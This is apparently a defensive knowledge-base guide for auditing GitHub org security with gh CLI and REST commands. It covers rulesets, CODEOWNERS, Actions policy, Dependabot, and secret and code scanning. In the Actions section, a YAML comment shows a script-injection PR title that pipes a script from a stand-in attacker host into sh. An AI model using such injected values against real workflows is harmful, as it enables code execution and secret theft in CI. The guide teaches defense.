---
title: GitHub Security Posture (Rulesets, Actions Policy, Dependabot, Secret & Code Scanning)
platforms: [GitHub]
languages: [Bash]
tasks: [Assurance, Hardening, Investigation, Incident Response]
category: Posture
tags: [github, branch protection, rulesets, codeowners, actions policy, sha pinning, dependabot, secret scanning, push protection, code scanning, codeql, pull_request_target, script injection]
aliases: [gh ruleset list, github branch protection api, github codeowners errors, require code owner review, github actions sha pinning required, pull_request_target risk, github script injection, dependabot alerts api, dependabot github-actions ecosystem, secret scanning alerts api, push protection bypassed, code scanning alerts org, codeql default setup]
difficulty: intermediate
verified: true
last_verified: 2026-10-18
---

# GitHub Security Posture

A secure GitHub org rests on five controls: protected default branches, required reviews from code owners, a tight Actions policy, dependency updates, and secret/code scanning with push protection. This page reads each one with `gh`, so you can audit an org without clicking through every repo.

!!! warning "Before you run anything"
    Every command was checked against docs.github.com REST reference and the GitHub CLI manual (2026-10-18); this guide does not run them against a live organization. Commands that change state are marked **change**. Secret scanning and code scanning on private repositories need GitHub Secret Protection / Code Security (formerly Advanced Security) licenses.

## 1. Branch protection, rulesets and CODEOWNERS

**Rulesets** are the current model: they stack (repo + org), have explicit **bypass actors**, can be in `evaluate` mode first, and cover tags as well as branches. Classic **branch protection** still works per branch.

```bash
REPO=my-org/app; ORG=my-org
gh ruleset list --repo "$REPO"                    # includes org rulesets that apply (--parents defaults to true)
gh ruleset list --org "$ORG"                      # needs admin:org
gh ruleset check main --repo "$REPO"              # every rule that applies to the branch
gh api "repos/$REPO/rulesets/<ruleset-id>" --jq '{name, enforcement, bypass_actors, rules: [.rules[].type]}'
gh api "repos/$REPO/branches/main/protection"     # classic protection; 404 = none
```

Baseline for `main`: require a pull request with at least one approval, **require review from Code Owners**, dismiss stale approvals, require status checks, block force pushes and deletion, require signed commits where your team signs. Keep `bypass_actors` empty or limited to a break-glass team, and watch `protected_branch.policy_override` in the [audit log](audit-logging.md#2-events-worth-an-alert).

`CODEOWNERS` lives in `.github/`, the repo root or `docs/`; the **last** matching pattern wins. Own the files that control security:

```text
*                       @my-org/app-team
/.github/               @my-org/platform-security
/.github/workflows/     @my-org/platform-security
/CODEOWNERS             @my-org/platform-security
```

```bash
gh api "repos/$REPO/codeowners/errors" --jq '.errors[] | {line, kind, message}'   # unknown users/teams silently own nothing
```

## 2. Repository security features at a glance

```bash
gh api "orgs/$ORG/repos?per_page=100" --paginate --jq '.[] | [.full_name, .visibility, (.security_and_analysis.secret_scanning.status // "n/a"), (.security_and_analysis.secret_scanning_push_protection.status // "n/a"), (.security_and_analysis.dependabot_security_updates.status // "n/a")] | @tsv'
```

Turn features on with **code security configurations** at the org level (*Org settings → Advanced Security → Configurations*) so new repos inherit them, rather than per repo.

## 3. Actions policy

```bash
gh api "orgs/$ORG/actions/permissions" --jq '{enabled_repositories, allowed_actions, sha_pinning_required}'
gh api "orgs/$ORG/actions/permissions/selected-actions"      # when allowed_actions = selected
gh api "orgs/$ORG/actions/permissions/workflow"              # default GITHUB_TOKEN permissions
```

- **Allowed actions:** GitHub-owned + verified creators + an explicit allowlist. Turn on **Require actions to be pinned to a full-length commit SHA** (`sha_pinning_required`); tags can be moved by whoever controls the action repo.
- **`GITHUB_TOKEN` default:** read-only; see [Keys & secrets](keys-secrets.md#2-least-privilege-github_token).
- **Fork PRs:** require approval for first-time and outside contributors before workflows run.
- **`pull_request_target`:** runs in the base repo's context with secrets and a write token. Never check out and build the PR head in it.
- **Script injection:** never interpolate untrusted context into `run:`; pass it through an environment variable.

```yaml
# Wrong: a PR titled  a"; curl evil.example | sh; "  runs in the shell
#   run: echo "${{ github.event.pull_request.title }}"
- name: Print title safely
  env:
    TITLE: ${{ github.event.pull_request.title }}
  run: printf '%s\n' "$TITLE"
```

- **Self-hosted runners:** never on public repos; use ephemeral runners and runner groups restricted to named repos.

## 4. Dependabot

`.github/dependabot.yml` keeps dependencies **and the actions you pinned** up to date:

```yaml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "weekly"
```

```bash
gh api "orgs/$ORG/dependabot/alerts?state=open&severity=critical,high&per_page=100" --paginate \
  --jq '.[] | [.repository.full_name, .security_advisory.ghsa_id, .dependency.package.name, .security_advisory.severity] | @tsv'
```

## 5. Secret scanning and push protection

Secret scanning finds known token formats in the full history; **push protection** blocks a push that adds one. A blocked user can bypass with a reason (or request a bypass when delegated bypass is on), and the bypass creates an alert.

```bash
gh api "orgs/$ORG/secret-scanning/alerts?state=open&per_page=100" --paginate \
  --jq '.[] | [.repository.full_name, .secret_type, (.validity // "unknown"), (.push_protection_bypassed // false), (.push_protection_bypassed_by.login // "-"), .created_at] | @tsv'
gh api -X PATCH "repos/$REPO" -f 'security_and_analysis[secret_scanning][status]=enabled' \
  -f 'security_and_analysis[secret_scanning_push_protection][status]=enabled'          # change
```

Triage `validity: active` first, then every `push_protection_bypassed: true`. A closed alert does **not** mean the secret is dead: revoke it at the issuer ([Incident response](incident-response.md#1-a-token-leaked-identify-and-revoke)).

## 6. Code scanning

```bash
gh api "repos/$REPO/code-scanning/default-setup" --jq '{state, languages, query_suite, updated_at}'
gh api "orgs/$ORG/code-scanning/alerts?state=open&severity=critical&per_page=100" --paginate \
  --jq '.[] | [.repository.full_name, .rule.id, .rule.security_severity_level, .most_recent_instance.location.path] | @tsv'
```

CodeQL **default setup** needs no workflow file; use advanced setup only for custom queries or build steps.

## Related

- [Keys & secrets](keys-secrets.md)
- [Persistence & hunting](persistence-hunting.md)
- [Azure Defender for Cloud](../azure/security-posture.md) · [AWS Security Hub](../aws/security-posture.md)

## Sources

- [About rulesets](https://docs.github.com/en/repositories/configuring-branches-and-merges-in-your-repository/managing-rulesets/about-rulesets) · [gh ruleset](https://cli.github.com/manual/gh_ruleset)
- [About code owners](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/customizing-your-repository/about-code-owners)
- [Secure use reference (Actions)](https://docs.github.com/en/actions/reference/security/secure-use)
- [GitHub Actions policy supports blocking and SHA pinning (changelog, 2025-08-15)](https://github.blog/changelog/2025-08-15-github-actions-policy-now-supports-blocking-and-sha-pinning-actions/)
- [Dependabot options reference](https://docs.github.com/en/code-security/dependabot/working-with-dependabot/dependabot-options-reference)
- [About push protection](https://docs.github.com/en/code-security/secret-scanning/introduction/about-push-protection) · [REST: secret scanning](https://docs.github.com/en/rest/secret-scanning/secret-scanning)
- [REST: code scanning](https://docs.github.com/en/rest/code-scanning/code-scanning) · [REST: Dependabot alerts](https://docs.github.com/en/rest/dependabot/alerts)
